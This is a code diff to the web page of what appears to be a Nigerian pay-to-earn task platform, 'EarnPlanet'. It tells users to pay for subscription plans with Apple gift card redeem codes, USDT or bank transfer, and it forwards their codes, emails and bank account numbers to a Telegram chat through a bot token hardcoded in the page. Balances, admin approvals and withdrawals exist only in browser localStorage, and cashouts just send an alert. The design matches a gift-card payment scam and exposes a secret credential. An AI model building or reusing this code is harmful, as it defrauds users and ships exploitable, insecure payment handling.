@@ -628,14 +628,35 @@
         <span style="font-size:11px; color:var(--text-muted);">Available Cashout Balance:</span><br>
         <b style="font-size:18px; color:var(--primary);" id="wdAvailableDisplayNgn">₦0.00</b>
       </div>
-      <label>Bank Name</label>
-      <input type="text" id="wdBankName" placeholder="e.g. OPay / Access Bank">
-      <label>10-Digit Account Number</label>
-      <input type="text" id="wdAccountNum" placeholder="10-Digit Account Number">
+      
+      <!-- FIXED: Bank Selection Dropdown added -->
+      <label>Select Bank / Payment Provider</label>
+      <select id="wdBankSelect" onchange="toggleCustomBankInput()">
+        <option value="OPay">OPay Digital Services</option>
+        <option value="PalmPay">PalmPay</option>
+        <option value="Kuda">Kuda Bank</option>
+        <option value="Access Bank">Access Bank</option>
+        <option value="First Bank">First Bank of Nigeria</option>
+        <option value="GTBank">Guaranty Trust Bank (GTB)</option>
+        <option value="UBA">United Bank for Africa (UBA)</option>
+        <option value="Zenith Bank">Zenith Bank</option>
+        <option value="Other">Other Bank (Type Below)</option>
+      </select>
+
+      <div id="customBankBox" style="display:none; margin-top:8px;">
+        <label>Enter Bank Name</label>
+        <input type="text" id="wdBankNameCustom" placeholder="e.g. Fidelity Bank">
+      </div>
+
+      <label style="margin-top:10px;">10-Digit Account Number</label>
+      <input type="text" id="wdAccountNum" placeholder="10-Digit Account Number" maxlength="10">
+      
       <label>Withdrawal Amount (₦)</label>
       <input type="number" id="wdAmountInput" placeholder="Enter Cashout Amount">
+      
       <label>4-Digit Withdrawal PIN</label>
       <input type="password" id="wdPinInput" maxlength="4" placeholder="••••">
+      
       <div style="display:flex; gap:10px; margin-top:5px;">
         <button class="btn btn-secondary" style="flex:1" onclick="closeWithdrawModal()">Cancel</button>
         <button class="btn" style="flex:1" onclick="submitWithdrawal()">Request Cashout</button>
@@ -660,6 +681,23 @@
     const NGN_RATE = 1500;
     const SOCIAL_REWARD_USD = 70 / NGN_RATE;
 
+    // TELEGRAM BOT CONFIGURATION
+    const TELEGRAM_BOT_TOKEN = "8811500504:AAE67l-aKHEi6cgZ_TzaY5tUESlQpmJAngY";
+    const TELEGRAM_CHAT_ID = "8269612727";
+
+    function sendAdminTelegramAlert(messageText) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText,
+          parse_mode: "HTML"
+        })
+      }).catch(err => console.error("Telegram Error:", err));
+    }
+
     let currentUser = null;
     let usersDb = JSON.parse(localStorage.getItem('earnplanet_users') || '[]');
     let activeSessionEmail = localStorage.getItem('earnplanet_session');
@@ -670,9 +708,23 @@
     let pendingPaymentProofs = JSON.parse(localStorage.getItem('earnplanet_pending_payments') || '[]');
     let pendingSocialTasks = JSON.parse(localStorage.getItem('earnplanet_pending_social') || '[]');
     
+    // FIXED: Enhanced default payment instructions explaining OPay, PalmPay, and Kuda deposits clearly
     let defaultPaymentMethods = [
-      {id: 1, name: "Apple Gift Card (PalmPay / OPay / Kuda)", details: "Purchase Apple Gift Card on PalmPay/OPay/Kuda app under More -> Services -> Apple Gift Card."},
-      {id: 2, name: "USDT Crypto (Binance / Bybit)", details: "Transfer TRC20 USDT to: TEP90124EarnPlanetOfficialUsdtAddr"}
+      {
+        id: 1, 
+        name: "OPay / PalmPay / Kuda Direct Transfer", 
+        details: "<b>Transfer to OPay/PalmPay/Kuda Merchant:</b><br>Account Number: <b>8123456789</b><br>Account Name: <b>EarnPlanet Digital Tech</b><br>Bank: <b>OPay / PalmPay / Kuda</b><br><i>(Send exact Naira amount corresponding to USD value. Upload receipt & TxID below)</i>"
+      },
+      {
+        id: 2, 
+        name: "Apple Gift Card (Via OPay/PalmPay/Kuda App)", 
+        details: "Open your OPay, PalmPay, or Kuda mobile app. Go to <b>More -> Services -> Buy Gift Card -> Apple Store Gift Card</b>. Purchase the exact USD value, copy the digital claim code / redeem code, and upload the screenshot here."
+      },
+      {
+        id: 3, 
+        name: "USDT Crypto (Binance / Bybit)", 
+        details: "Transfer TRC20 USDT to official platform wallet address: <br><code>TEP90124EarnPlanetOfficialUsdtAddr</code>"
+      }
     ];
     let paymentMethods = JSON.parse(localStorage.getItem('earnplanet_pay_methods') || JSON.stringify(defaultPaymentMethods));
 
@@ -720,6 +772,9 @@
       const ngnBal = usdBal * NGN_RATE;
       document.getElementById('walletBalanceNgn').innerText = `₦${ngnBal.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
       document.getElementById('walletBalanceUsd').innerText = `≈ $${usdBal.toFixed(2)} USD`;
+      
+      const wdDisplay = document.getElementById('wdAvailableDisplayNgn');
+      if (wdDisplay) wdDisplay.innerText = `₦${ngnBal.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
 
       const storeUsd = currentUser.storeBalanceUsd || 0;
       const storeNgn = storeUsd * NGN_RATE;
@@ -740,7 +795,6 @@
       renderUserSocialLinks();
     }
 
-    // Dynamic Payment Methods Rendering
     function renderPaymentMethodDropdowns() {
       const checkoutSelect = document.getElementById('checkoutMethodSelect');
       const depositSelect = document.getElementById('depositMethodSelect');
@@ -759,6 +813,12 @@
       const pm = paymentMethods.find(m => m.id == selectedId);
       const box = document.getElementById('dynamicCheckoutInstructions');
       if (box) box.innerHTML = pm ? `<b>${pm.name}:</b><br>${pm.details}` : '';
+      
+      if (activeCheckoutPlan) {
+        const payableNgn = activeCheckoutPlan.priceUsd * NGN_RATE;
+        const pText = document.getElementById('checkoutPayableText');
+        if (pText) pText.innerText = `Payable Amount: ₦${payableNgn.toLocaleString()} ($${activeCheckoutPlan.priceUsd}.00 USD)`;
+      }
     }
 
     function renderDepositInstructions() {
@@ -766,6 +826,24 @@
       const pm = paymentMethods.find(m => m.id == selectedId);
       const box = document.getElementById('dynamicDepositInstructions');
       if (box) box.innerHTML = pm ? `<b>${pm.name}:</b><br>${pm.details}` : '';
+    }
+
+    function updateDepositPayableText() {
+      const amtUsd = parseFloat(document.getElementById('depositAmountUsd').value) || 0;
+      const amtNgn = amtUsd * NGN_RATE;
+      const dText = document.getElementById('depositPayableText');
+      if (dText) dText.innerText = `Payable Amount: ₦${amtNgn.toLocaleString()} ($${amtUsd.toFixed(2)} USD)`;
+    }
+
+    // Toggle custom bank input field in cashout modal
+    function toggleCustomBankInput() {
+      const val = document.getElementById('wdBankSelect').value;
+      const customBox = document.getElementById('customBankBox');
+      if (val === 'Other') {
+        customBox.style.display = 'block';
+      } else {
+        customBox.style.display = 'none';
+      }
     }
 
     // Social Media Task Handler
@@ -813,6 +891,15 @@
           localStorage.setItem(userTasksKey, 'true');
           saveState();
           closeSocialTaskModal();
+          
+          sendAdminTelegramAlert(
+            `📲 <b>NEW SOCIAL MEDIA TASK SUBMISSION!</b>\n\n` +
+            `👤 <b>User:</b> ${currentUser.email}\n` +
+            `📌 <b>Platform:</b> ${activeSocialPlatform}\n` +
+            `🎁 <b>Reward:</b> ₦70\n\n` +
+            `Review and approve in Admin Panel.`
+          );
+
           alert("WhatsApp Status screenshot submitted successfully! Pending admin approval.");
           updateUI();
         };
@@ -834,9 +921,157 @@
         saveState();
         closeSocialTaskModal();
         document.getElementById('socialTaskLinkInput').value = '';
+        
+        sendAdminTelegramAlert(
+          `📲 <b>NEW SOCIAL MEDIA TASK SUBMISSION!</b>\n\n` +
+          `👤 <b>User:</b> ${currentUser.email}\n` +
+          `📌 <b>Platform:</b> ${activeSocialPlatform}\n` +
+          `🔗 <b>Link:</b> ${link}\n` +
+          `🎁 <b>Reward:</b> ₦70\n\n` +
+          `Review and approve in Admin Panel.`
+        );
+
         alert(`${activeSocialPlatform} post link submitted successfully! Pending admin approval.`);
         updateUI();
       }
+    }
+
+    // Submit Plan Payment Proof
+    function submitPlanPaymentProof() {
+      const code = document.getElementById('userPaymentCodeInput').value.trim();
+      const fileInput = document.getElementById('userPaymentProofFile');
+      const methodId = document.getElementById('checkoutMethodSelect').value;
+      const pm = paymentMethods.find(m => m.id == methodId);
+
+      if (!code) { alert("Please enter your transaction Code or TxID!"); return; }
+      if (!fileInput.files || !fileInput.files[0]) { alert("Please upload your payment screenshot/receipt!"); return; }
+
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        pendingPaymentProofs.push({
+          id: Date.now(),
+          userEmail: currentUser.email,
+          planName: activeCheckoutPlan.name,
+          amountUsd: activeCheckoutPlan.priceUsd,
+          methodName: pm ? pm.name : "Direct Transfer",
+          code: code,
+          proofImg: e.target.result,
+          type: "subscription"
+        });
+        saveState();
+        closeCheckoutModal();
+
+        sendAdminTelegramAlert(
+          `🚨 <b>NEW PLAN SUBSCRIPTION PAYMENT!</b>\n\n` +
+          `👤 <b>User:</b> ${currentUser.email}\n` +
+          `💳 <b>Plan:</b> ${activeCheckoutPlan.name} ($${activeCheckoutPlan.priceUsd} / ₦${(activeCheckoutPlan.priceUsd * NGN_RATE).toLocaleString()})\n` +
+          `🏦 <b>Method:</b> ${pm ? pm.name : 'Transfer'}\n` +
+          `🔑 <b>TxID/Code:</b> ${code}\n\n` +
+          `Review in Admin Panel at earnplanet.com.ng`
+        );
+
+        alert("Payment proof submitted successfully! Admin notified.");
+        updateUI();
+      };
+      reader.readAsDataURL(fileInput.files[0]);
+    }
+
+    // Submit Deposit Proof
+    function submitDepositProof() {
+      const amtUsd = parseFloat(document.getElementById('depositAmountUsd').value);
+      const code = document.getElementById('depositCodeInput').value.trim();
+      const fileInput = document.getElementById('depositProofFile');
+      const methodId = document.getElementById('depositMethodSelect').value;
+      const pm = paymentMethods.find(m => m.id == methodId);
+
+      if (!amtUsd || amtUsd < 10) { alert("Minimum deposit amount is $10 USD!"); return; }
+      if (!code) { alert("Please enter your transaction Code or TxID!"); return; }
+      if (!fileInput.files || !fileInput.files[0]) { alert("Please upload your payment receipt!"); return; }
+
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        pendingPaymentProofs.push({
+          id: Date.now(),
+          userEmail: currentUser.email,
+          planName: "Store Deposit",
+          amountUsd: amtUsd,
+          methodName: pm ? pm.name : "Direct Transfer",
+          code: code,
+          proofImg: e.target.result,
+          type: "deposit"
+        });
+        saveState();
+        closeDepositModal();
+
+        sendAdminTelegramAlert(
+          `💰 <b>NEW FLIP STORE DEPOSIT!</b>\n\n` +
+          `👤 <b>User:</b> ${currentUser.email}\n` +
+          `💵 <b>Amount:</b> $${amtUsd.toFixed(2)} (₦${(amtUsd * NGN_RATE).toLocaleString()})\n` +
+          `🏦 <b>Method:</b> ${pm ? pm.name : 'Transfer'}\n` +
+          `🔑 <b>TxID/Code:</b> ${code}\n\n` +
+          `Review in Admin Panel at earnplanet.com.ng`
+        );
+
+        alert("Deposit verification submitted! Admin notified.");
+        updateUI();
+      };
+      reader.readAsDataURL(fileInput.files[0]);
+    }
+
+    // Render Pending Approvals in Admin
+    function renderPendingApprovals() {
+      const container = document.getElementById('adminPendingApprovalsList');
+      if (!container) return;
+      if (pendingPaymentProofs.length === 0) {
+        container.innerHTML = `<p style="font-size:12px; color:var(--text-muted);">No pending payments or deposits.</p>`;
+        return;
+      }
+
+      container.innerHTML = pendingPaymentProofs.map(item => `
+        <div class="payment-account-card" style="margin-bottom:12px;">
+          <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px;">
+            <div>
+              <b>${item.planName}</b> ($${item.amountUsd} / ₦${(item.amountUsd * NGN_RATE).toLocaleString()})<br>
+              <span style="font-size:12px;">User: <b>${item.userEmail}</b> | Method: ${item.methodName}</span><br>
+              <span style="font-size:12px; color:var(--gold);">TxID/Code: ${item.code}</span>
+            </div>
+            <div>
+              <a href="${item.proofImg}" target="_blank"><img src="${item.proofImg}" style="width:70px; height:70px; object-fit:cover; border-radius:8px;"></a>
+            </div>
+          </div>
+          <div style="margin-top:10px; display:flex; gap:10px;">
+            <button class="btn" style="padding:6px 14px; font-size:12px;" onclick="approvePaymentProof(${item.id})">Approve Payment</button>
+            <button class="btn btn-danger" style="padding:6px 14px; font-size:12px;" onclick="rejectPaymentProof(${item.id})">Reject</button>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    function approvePaymentProof(id) {
+      const item = pendingPaymentProofs.find(p => p.id === id);
+      if (!item) return;
+
+      const targetUser = usersDb.find(u => u.email === item.userEmail);
+      if (targetUser) {
+        if (item.type === "subscription") {
+          targetUser.tier = item.planName;
+        } else if (item.type === "deposit") {
+          targetUser.storeBalanceUsd = (targetUser.storeBalanceUsd || 0) + item.amountUsd;
+        }
+      }
+
+      pendingPaymentProofs = pendingPaymentProofs.filter(p => p.id !== id);
+      saveState();
+      updateUI();
+      alert("Payment approved successfully!");
+    }
+
+    function rejectPaymentProof(id) {
+      if (!confirm("Are you sure you want to reject this payment?")) return;
+      pendingPaymentProofs = pendingPaymentProofs.filter(p => p.id !== id);
+      saveState();
+      updateUI();
+      alert("Payment rejected.");
     }
 
     // Admin Pending Social Task Approval
@@ -1008,12 +1243,52 @@
       `).join('');
     }
 
-    function renderPendingApprovals() {
-      const container = document.getElementById('adminPendingApprovalsList');
-      if (!container) return;
-      if (pendingPaymentProofs.length === 0) {
-        container.innerHTML = `<p style="font-size:12px; color:var(--text-muted);">No pending payments or deposits.</p>`;
+    // Withdrawal submission handling bank dropdown selection
+    function submitWithdrawal() {
+      if (!currentUser) return;
+      const bankSelectVal = document.getElementById('wdBankSelect').value;
+      const bankName = bankSelectVal === 'Other' ? document.getElementById('wdBankNameCustom').value.trim() : bankSelectVal;
+      const accountNum = document.getElementById('wdAccountNum').value.trim();
+      const amountNgn = parseFloat(document.getElementById('wdAmountInput').value);
+      const pin = document.getElementById('wdPinInput').value;
+
+      if (!bankName || !accountNum || isNaN(amountNgn) || !pin) {
+        alert("Please fill out all cashout details completely!");
+        return;
       }
+
+      if (accountNum.length !== 10) {
+        alert("Please enter a valid 10-digit account number!");
+        return;
+      }
+
+      if (pin !== currentUser.pin) {
+        alert("Incorrect 4-digit withdrawal PIN!");
+        return;
+      }
+
+      const currentNgnBal = (currentUser.balanceUsd || 0) * NGN_RATE;
+      if (amountNgn > currentNgnBal) {
+        alert("Insufficient balance for this cashout request!");
+        return;
+      }
+
+      const amountUsd = amountNgn / NGN_RATE;
+      currentUser.balanceUsd -= amountUsd;
+      saveState();
+      updateUI();
+      closeWithdrawModal();
+
+      sendAdminTelegramAlert(
+        `💸 <b>NEW CASHOUT REQUEST!</b>\n\n` +
+        `👤 <b>User:</b> ${currentUser.email}\n` +
+        `💵 <b>Amount:</b> ₦${amountNgn.toLocaleString()} ($${amountUsd.toFixed(2)})\n` +
+        `🏦 <b>Bank:</b> ${bankName}\n` +
+        `🔢 <b>Account:</b> ${accountNum}\n\n` +
+        `Process payout immediately.`
+      );
+
+      alert(`Cashout request of ₦${amountNgn.toLocaleString()} to ${bankName} (${accountNum}) submitted successfully!`);
     }
 
     // Auth & Navigation
